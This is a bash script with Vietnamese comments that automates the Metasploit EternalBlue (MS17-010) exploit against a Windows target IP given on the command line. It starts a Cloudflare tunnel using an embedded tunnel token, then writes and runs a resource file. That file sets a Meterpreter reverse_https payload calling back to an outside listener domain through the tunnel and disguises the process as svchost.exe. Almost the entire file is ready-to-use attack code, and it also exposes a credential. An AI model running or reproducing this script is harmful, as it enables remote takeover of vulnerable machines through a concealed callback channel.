#!/bin/bash

# === PHẦN CẤU HÌNH - BẠN CẦN THAY ĐỔI Ở ĐÂY ===

# Token của tunnel 'my-web-server' đã được điền sẵn
TUNNEL_TOKEN="eyJhIjoiOTNiYmI5MDg4YjMwMTNjMWM4ZGY5OGZlZmE1YWJiODEiLCJ0IjoiOWVmZWQ5MzYtOWNhYy00ZjcwLTg4MWQtOTZiZTk3ZjljNDMxIiwicyI6IllqWTRNRFkzT1dFdE9XSmtaQzAwWkRabUxUa3dNVEV0T1Rnek1qWTNOV1l3T0RZMiJ9"
TUNNEL_NAME="my-web-server"

# Tên miền công khai của listener đã cấu hình trên Cloudflare
LISTENER_HOST="listener.thinkencyber.io.vn"

# Cổng nội bộ mà listener trên Cloudflare đang trỏ tới
INTERNAL_MSF_PORT=8080

# === KẾT THÚC PHẦN CẤU HÌNH ===


# Kiểm tra xem người dùng đã nhập IP mục tiêu chưa
if [ -z "$1" ]; then
    echo -e "\033[91m[!] Lỗi: Bạn chưa cung cấp địa chỉ IP của máy mục tiêu.\033[0m"
    echo -e "\033[93m    -> Cách dùng: ./run_eternalblue_cloudflare.sh <IP_MỤC_TIÊU>\033[0m"
    exit 1
fi

RHOST=$1 # Lấy IP mục tiêu từ tham số dòng lệnh

# Hàm dọn dẹp khi thoát (Ctrl+C)
cleanup() {
    echo -e "\n\033[91m[*] User requested exit or Metasploit finished. Shutting down...\033[0m"
    if [ ! -z "$CLOUDFLARED_PID" ]; then
        echo -e "\033[94m[+] Stopping Cloudflare Tunnel (PID: $CLOUDFLARED_PID)...\033[0m"
        kill $CLOUDFLARED_PID
    fi
    # Xóa file handler tạm
    if [ -f "eternalblue_handler.rc" ]; then
        rm eternalblue_handler.rc
    fi
    echo -e "\033[92m[+] Cleanup complete. Goodbye!\033[0m"
    exit
}

trap cleanup INT

# BƯỚC 1: KHỞI ĐỘNG CLOUDFLARE TUNNEL Ở CHẾ ĐỘ NỀN
echo -e "\033[94m[+] Starting Cloudflare Tunnel '$TUNNEL_NAME' in the background...\033[0m"
cloudflared tunnel run --token $TUNNEL_TOKEN $TUNNEL_NAME > /dev/null 2>&1 &
CLOUDFLARED_PID=$!
echo -e "\033[92m    -> Tunnel running with PID: $CLOUDFLARED_PID\033[0m"
echo -e "\033[93m    -> Waiting 5 seconds for tunnel to stabilize...\033[0m"
sleep 5

# BƯỚC 2: TẠO FILE HANDLER CHO METASPLOIT
HANDLER_FILE="eternalblue_handler.rc"
echo -e "\033[94m[+] Creating Metasploit resource file: $HANDLER_FILE\033[0m"
cat > $HANDLER_FILE << EOL
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $RHOST
set payload windows/x64/meterpreter/reverse_https
set LHOST $LISTENER_HOST
set LPORT 443
set ReverseListenerBindAddress 127.0.0.1
set ReverseListenerBindPort $INTERNAL_MSF_PORT
set ProcessName svchost.exe
set VERBOSE true
set SMBTimeout 60
set ExitOnSession false
exploit -j
EOL

echo -e "\033[92m[+] Resource file created successfully.\033[0m"

# BƯỚC 3: HIỂN THỊ THÔNG TIN VÀ KHỞI ĐỘNG METASPLOIT
echo -e "\n\033[92m===============================================================\033[0m"
echo -e "\033[92m[+] LAUNCHING ETERNALBLUE ATTACK VIA CLOUDFLARE TUNNEL\033[0m"
echo -e "\033[93m    -> Target IP (RHOST):       $RHOST\033[0m"
echo -e "\033[93m    -> Payload Callback (LHOST):  $LISTENER_HOST (via Cloudflare)\033[0m"
echo -e "\033[93m    -> Callback Port (LPORT):   443 (Public HTTPS Port)\033[0m"
echo -e "\033[93m    -> Internal Listener Port:  $INTERNAL_MSF_PORT (on 127.0.0.1)\033[0m"
echo -e "\033[92m===============================================================\n\033[0m"
echo -e "\033[94m[+] Starting Metasploit and running the exploit...\033[0m"

# Khởi động msfconsole với file resource
msfconsole -r $HANDLER_FILE

# Sau khi msfconsole thoát, chạy hàm dọn dẹp
cleanup
